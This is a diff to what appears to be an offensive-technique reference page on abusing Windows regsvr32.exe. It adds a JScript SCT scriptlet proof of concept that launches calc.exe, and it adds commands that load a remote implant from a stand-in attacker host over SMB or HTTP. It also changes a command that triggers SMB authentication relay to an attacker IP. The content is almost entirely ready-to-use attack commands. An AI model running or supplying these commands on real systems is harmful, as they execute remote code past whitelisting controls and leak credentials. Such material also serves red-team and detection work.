@@ -19,6 +19,21 @@ C:\> regsvr32.exe /s implant.dll
 
 Execute a SCT implant.
 
+```xml
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
+        ]]>
+</script>
+</registration>
+</scriptlet>
+```
+
 ```
 C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
 ```
@@ -27,12 +42,14 @@ Execute a fileless implant.
 
 ```
 C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll
+
+C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\implant.sct scrobj.dll
 ```
 
 Execute command to perform SMB authentication relay.
 
 ```
-C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
+C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
 ```
 
 ---
